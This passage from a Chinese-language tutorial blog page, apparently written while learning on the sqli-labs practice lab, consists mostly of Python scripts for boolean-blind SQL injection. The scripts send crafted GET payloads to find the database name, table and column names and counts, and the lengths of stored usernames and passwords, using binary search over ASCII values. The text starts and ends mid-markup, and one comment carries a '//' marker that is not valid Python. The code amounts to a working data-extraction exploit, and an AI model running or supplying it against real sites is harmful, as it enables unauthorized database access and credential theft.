class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        db_len_url = url + <span class="string">&quot;?id=1&#x27;))  and length(database())=&quot;</span> + <span class="built_in">str</span>(db_len) + <span class="string">&quot;--+&quot;</span></span><br><span class="line">        response = requests.get(db_len_url)          <span class="comment">#GET方法发送含payload的request</span></span><br><span class="line">        <span class="keyword">if</span> response.text.find(flag) != -<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The name of current database contains &quot;</span> + <span class="built_in">str</span>(db_len) + <span class="string">&quot; characters.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            db_len = db_len + <span class="number">1</span></span><br><span class="line">    <span class="comment">#name</span></span><br><span class="line">    <span class="keyword">global</span> db</span><br><span class="line">    db = <span class="built_in">str</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,db_len+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> keylist:</span><br><span class="line">            t = <span class="built_in">ord</span>(c)</span><br><span class="line">            db_name_url = url + <span class="string">&quot;?id=1&#x27;)) and ascii(substr(database(),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1))=&quot;</span> + <span class="built_in">str</span>(t) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">            r = requests.get(db_name_url)</span><br><span class="line">            <span class="keyword">if</span> r.text.find(flag) != -<span class="number">1</span>:</span><br><span class="line">                db = db + c</span><br><span class="line">                <span class="comment">#print( str(c) )</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The name of current database is &quot;</span> + <span class="built_in">str</span>(db))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Table</span>():</span><br><span class="line">    <span class="comment">#table_num</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">20</span>):</span><br><span class="line">        table_num_url = url + <span class="string">&quot;?id=1&#x27;)) and (select count(table_name) from information_schema.tables where table_schema=&#x27;&quot;</span> + db + <span class="string">&quot;&#x27;)=&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">        response = requests.get(table_num_url)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(flag) != -<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The current database has &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; tables&quot;</span>)</span><br><span class="line">            table_num = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#table_length</span></span><br><span class="line">    table_len = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, table_num):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">            table_length_url = url + <span class="string">&quot;?id=1&#x27;)) and (select length(table_name) from information_schema.tables where table_schema=&#x27;&quot;</span> + db + <span class="string">&quot;&#x27; limit &quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">            r = requests.get(table_length_url)</span><br><span class="line">            <span class="keyword">if</span> r.text.find(flag) != -<span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The length of the table name in table &quot;</span> + <span class="built_in">str</span>(j+<span class="number">1</span>) + <span class="string">&quot; is:&quot;</span> + <span class="built_in">str</span>(k))</span><br><span class="line">                table_len.append(k)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#table_name</span></span><br><span class="line">    t_name = &#123;&#125;</span><br><span class="line">    tn = <span class="built_in">str</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, table_num):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span>  <span class="built_in">range</span>(<span class="number">0</span>, table_len[i]):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> keylist:</span><br><span class="line">                t = <span class="built_in">ord</span>(c)</span><br><span class="line">                k = j + <span class="number">1</span></span><br><span class="line">                url_table_name = url + <span class="string">&quot;?id=1&#x27;)) and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(k) +<span class="string">&quot;,1))=&#x27;&quot;</span>+ <span class="built_in">str</span>(t) + <span class="string">&quot;&#x27; --+&quot;</span></span><br><span class="line">                re = requests.get(url_table_name)</span><br><span class="line">                <span class="keyword">if</span> re.text.find(flag) != -<span class="number">1</span>:</span><br><span class="line">                    tn = tn + c</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        t_name[i] = <span class="built_in">str</span>(tn)</span><br><span class="line">        tn = <span class="string">&quot;&quot;</span>                     <span class="comment">#重置字符串</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The table name of &quot;</span> + <span class="built_in">str</span>(i+<span class="number">1</span>) + <span class="string">&quot; is:&quot;</span> + <span class="built_in">str</span>(t_name[i]) )</span><br><span class="line"></span><br><span class="line">Database_length_name()</span><br><span class="line">Table()</span><br></pre></td></tr></table></figure><p>代码学习的链接<a href="https://blog.csdn.net/weixin_43872099/article/details/104830426"> (1 条消息) sqli-labs 布尔盲注脚本的编写_sqli-labs 布尔盲注 写文件_0xdawn 的博客 - CSDN 博客</a></p><h3 id="数据库库名长度"><a class="markdownIt-Anchor" href="#数据库库名长度">#</a> 数据库库名长度</h3><p>数据库库名长度在我学习 web 的时间段里没有见过特别长的名字，十几个字母顶天了，这个不适用二分法也不会很慢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">db_length</span>():</span><br><span class="line">    db_len = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        str_db_len = <span class="built_in">str</span>(db_len)</span><br><span class="line">        db_len_url = url + <span class="string">&quot;&#x27; and length(database())=&quot;</span> + str_db_len + <span class="string">&quot;--+&quot;</span></span><br><span class="line">        r = requests.get(db_len_url)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n当前数据库名长度为：%s&quot;</span> %str_db_len)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            db_len = db_len + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> db_len</span><br></pre></td></tr></table></figure><h3 id="获取当前数据库库名"><a class="markdownIt-Anchor" href="#获取当前数据库库名">#</a> 获取当前数据库库名</h3><p>这个因为要获取 ascii 码值如果用普通的布尔注入回显正不正确来判断的话，没办法区分大小写，就不能获取准确的数据库大小写比如说 sqli-labs 的数据库 security，ascii 值大写字母比小写字母值小，在使用循环递增判断的时候 ascii+1 获取出来的会是 SECURITY 而不是小写字母，虽然数据库名称大部分没啥关系但是在获取 flag 的时候如果不适用 ascii 准确的获取大小写就会出问题，而二分法就能够极大的提高脚本的速度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">db_name</span>():</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    km = <span class="string">&quot;&quot;</span></span><br><span class="line">    //二分法猜解</span><br><span class="line">    <span class="keyword">while</span> (i&lt;=db_len):</span><br><span class="line">        str_i = <span class="string">&#x27;%d&#x27;</span> %i</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (low + high) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            mid = (low + high) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> (low + high) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            mid = (low + high + <span class="number">1</span>) / <span class="number">2</span></span><br><span class="line">        str_mid = <span class="string">&#x27;%d&#x27;</span> %mid</span><br><span class="line"></span><br><span class="line">        name_url = url + <span class="string">&quot;&#x27; and ascii(substr((select schema_name from information_schema.schemata limit 5,1),&quot;</span>+str_i+<span class="string">&quot;,1))=&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">        response = requests.get(name_url)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            km += <span class="built_in">chr</span>(<span class="built_in">int</span>(mid))</span><br><span class="line">            <span class="built_in">print</span>(km)</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            low = <span class="number">32</span></span><br><span class="line">            high = <span class="number">126</span></span><br><span class="line">        <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            name_url = url + <span class="string">&quot;&#x27; and ascii(substr((select schema_name from information_schema.schemata limit 5,1),&quot;</span>+str_i+<span class="string">&quot;,1))&gt;&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">            response = requests.get(name_url)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">                low = mid</span><br><span class="line">            <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                high = mid</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;当前数据库库名为：&quot;</span>+km)</span><br><span class="line">    <span class="keyword">return</span> km</span><br></pre></td></tr></table></figure><h3 id="判断表的个数"><a class="markdownIt-Anchor" href="#判断表的个数">#</a> 判断表的个数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">table_num</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        str_i = <span class="string">&#x27;%d&#x27;</span> %i</span><br><span class="line">        num_url = url + <span class="string">&quot;&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;&quot;</span>+db_name+<span class="string">&quot;&#x27;)=&quot;</span>+str_i+<span class="string">&quot;--+&quot;</span></span><br><span class="line">        r = requests.get(num_url)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n数据表个数为：%s&quot;</span> %str_i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br></pre></td></tr></table></figure><h3 id="判断表名长度"><a class="markdownIt-Anchor" href="#判断表名长度">#</a> 判断表名长度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">table_len</span>():</span><br><span class="line">    t_len = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,table_num):</span><br><span class="line">        str_i = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">            str_j = <span class="built_in">str</span>(j)</span><br><span class="line">            len_url = url + <span class="string">&quot;&#x27; and (select length(table_name) from information_schema.tables where table_schema=&#x27;&quot;</span>+db_name+<span class="string">&quot;&#x27; limit &quot;</span>+str_i+<span class="string">&quot;,1)=&quot;</span>+str_j+<span class="string">&quot;%23&quot;</span></span><br><span class="line">            r = requests.get(len_url)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;第&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;张表的表名长度为：&quot;</span>+str_j)</span><br><span class="line">                t_len.append(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> t_len</span><br></pre></td></tr></table></figure><h3 id="获取表名"><a class="markdownIt-Anchor" href="#获取表名">#</a> 获取表名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">table_name</span>():</span><br><span class="line">    tname = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,table_num):</span><br><span class="line">        str_i = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(table_num):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                k = <span class="number">1</span></span><br><span class="line">                low = <span class="number">32</span></span><br><span class="line">                high = <span class="number">126</span></span><br><span class="line">                bm = <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">while</span> (k&lt;=t_len[j]):</span><br><span class="line">                    str_k = <span class="built_in">str</span>(k)</span><br><span class="line">                    <span class="keyword">if</span> (low + high) % <span class="number">2</span> ==<span class="number">0</span>:</span><br><span class="line">                        mid = (low + high) / <span class="number">2</span></span><br><span class="line">                    <span class="keyword">elif</span> (low + high) % <span class="number">2</span> !=<span class="number">0</span>:</span><br><span class="line">                        mid = (low + high + <span class="number">1</span>) /<span class="number">2</span></span><br><span class="line">                    str_mid = <span class="built_in">str</span>(mid)</span><br><span class="line">                    name_url = url + <span class="string">&quot;&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_k+<span class="string">&quot;,1))=&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                    r = requests.get(name_url)</span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                        bm += <span class="built_in">chr</span>(<span class="built_in">int</span>(mid))</span><br><span class="line">                        <span class="built_in">print</span>(bm)</span><br><span class="line">                        k = k+<span class="number">1</span></span><br><span class="line">                        low = <span class="number">32</span></span><br><span class="line">                        high = <span class="number">126</span></span><br><span class="line">                    <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        name_url = url + <span class="string">&quot;&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_k+<span class="string">&quot;,1))&gt;&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                        r = requests.get(name_url)</span><br><span class="line">                        <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                            low = mid</span><br><span class="line">                        <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                            high = mid</span><br><span class="line">                tname[<span class="built_in">str</span>(j+<span class="number">1</span>)] = <span class="built_in">str</span>(bm)</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> tname.items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]| &quot;</span>+key+<span class="string">&quot; | &quot;</span>+value)</span><br><span class="line">    <span class="keyword">return</span> tname</span><br></pre></td></tr></table></figure><h3 id="获取表中的列名个数"><a class="markdownIt-Anchor" href="#获取表中的列名个数">#</a> 获取表中的列名个数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">column_num</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        str_i = <span class="built_in">str</span>(i)</span><br><span class="line">        num_url = url + <span class="string">&quot;&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;&quot;</span>+table_name+<span class="string">&quot;&#x27; and table_schema=&#x27;&quot;</span>+db_name+<span class="string">&quot;&#x27;)=&quot;</span>+str_i+<span class="string">&quot;--+&quot;</span></span><br><span class="line">        r = requests.get(num_url)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(table_name+<span class="string">&quot;表中列的个数为：%s&quot;</span> %str_i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br></pre></td></tr></table></figure><h3 id="列名长度"><a class="markdownIt-Anchor" href="#列名长度">#</a> 列名长度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">column_len</span>():</span><br><span class="line">    c_len = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,column_num):</span><br><span class="line">        str_i = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">            str_j = <span class="built_in">str</span>(j)</span><br><span class="line">            len_url = url + <span class="string">&quot;&#x27; and (select length(column_name) from information_schema.columns where table_name=&#x27;&quot;</span>+table_name+<span class="string">&quot;&#x27; and table_schema=&#x27;&quot;</span>+db_name+<span class="string">&quot;&#x27;limit &quot;</span>+str_i+<span class="string">&quot;,1)=&quot;</span>+str_j+<span class="string">&quot;%23&quot;</span></span><br><span class="line">            r = requests.get(len_url)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                c_len.append(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;第&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;列的列名长度为：&quot;</span>+str_j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> c_len</span><br></pre></td></tr></table></figure><h3 id="猜解列名"><a class="markdownIt-Anchor" href="#猜解列名">#</a> 猜解列名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>():</span><br><span class="line">    cname = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, column_num):</span><br><span class="line">        str_i = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(column_num):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                k = <span class="number">1</span></span><br><span class="line">                low = <span class="number">32</span></span><br><span class="line">                high = <span class="number">126</span></span><br><span class="line">                cm = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">while</span> k &lt;= column_len[j]:</span><br><span class="line">                    str_k = <span class="built_in">str</span>(k)</span><br><span class="line">                    mid = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">if</span> (low + high) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                        mid = (low + high) / <span class="number">2</span></span><br><span class="line">                    <span class="keyword">elif</span> (low + high) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                        mid = (low + high + <span class="number">1</span>) / <span class="number">2</span></span><br><span class="line">                    str_mid = <span class="built_in">str</span>(mid)</span><br><span class="line">                    name_url = url + <span class="string">&quot;&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;&quot;</span>+table_name+<span class="string">&quot;&#x27; and table_schema=&#x27;&quot;</span>+db_name+<span class="string">&quot;&#x27; limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_k+<span class="string">&quot;,1))=&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                    r = requests.get(name_url)</span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                        cm += <span class="built_in">chr</span>(<span class="built_in">int</span>(mid))</span><br><span class="line">                        <span class="built_in">print</span>(cm)</span><br><span class="line">                        k = k+<span class="number">1</span></span><br><span class="line">                        low = <span class="number">32</span></span><br><span class="line">                        high = <span class="number">126</span></span><br><span class="line">                    <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        name_url = url + <span class="string">&quot;&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;&quot;</span>+table_name+<span class="string">&quot;&#x27; and table_schema=&#x27;&quot;</span>+db_name+<span class="string">&quot;&#x27; limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_k+<span class="string">&quot;,1))&gt;&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                        r = requests.get(name_url)</span><br><span class="line">                        <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                            low = mid</span><br><span class="line">                        <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                            high = mid</span><br><span class="line">                cname[<span class="built_in">str</span>(j)] = <span class="built_in">str</span>(cm)</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> cname.items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]| &quot;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(key)+<span class="number">1</span>)+<span class="string">&quot; | &quot;</span>+value)</span><br><span class="line">    <span class="keyword">return</span> cname</span><br></pre></td></tr></table></figure><h3 id="判断字段个数"><a class="markdownIt-Anchor" href="#判断字段个数">#</a> 判断字段个数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dump_num</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,column_num):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            str_j = <span class="built_in">str</span>(j)</span><br><span class="line">            num_url = url + <span class="string">&quot;&#x27; and (select count(&quot;</span>+cname[<span class="built_in">str</span>(i)]+<span class="string">&quot;) from &quot;</span>+db_name+<span class="string">&quot;.&quot;</span>+table_name+<span class="string">&quot;)=&quot;</span>+str_j+<span class="string">&quot;--+&quot;</span></span><br><span class="line">            r = requests.get(num_url)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(cname[<span class="built_in">str</span>(i)]+<span class="string">&quot;列中的字段数为：%s&quot;</span> %str_j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> j</span><br></pre></td></tr></table></figure><h3 id="判断字段长度"><a class="markdownIt-Anchor" href="#判断字段长度">#</a> 判断字段长度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dump_len</span>():</span><br><span class="line">    user_len = []</span><br><span class="line">    pass_len = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,dump_num):</span><br><span class="line">        str_i = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">            str_j = <span class="built_in">str</span>(j)</span><br><span class="line">            len_url = url + <span class="string">&quot;&#x27; and (select length(username) from &quot;</span>+db_name+<span class="string">&quot;.&quot;</span>+table_name+<span class="string">&quot; limit &quot;</span>+str_i+<span class="string">&quot;,1)=&quot;</span>+str_j+<span class="string">&quot;%23&quot;</span></span><br><span class="line">            r = requests.get(len_url)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                user_len.append(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;username第&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;个字段长度为：&quot;</span>+str_j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">            str_k = <span class="built_in">str</span>(k)</span><br><span class="line">            len_url = url + <span class="string">&quot;&#x27; and (select length(password) from &quot;</span>+db_name+<span class="string">&quot;.&quot;</span>+table_name+<span class="string">&quot; limit &quot;</span>+str_i+<span class="string">&quot;,1)=&quot;</span>+str_k+<span class="string">&quot;%23&quot;</span></span><br><span class="line">            r = requests.get(len_url)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                pass_len.append(k)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;password第&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;个字段长度为：&quot;</span>+str_k)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> (user_len,pass_len)</span><br></pre></td></tr></table></figure><h3 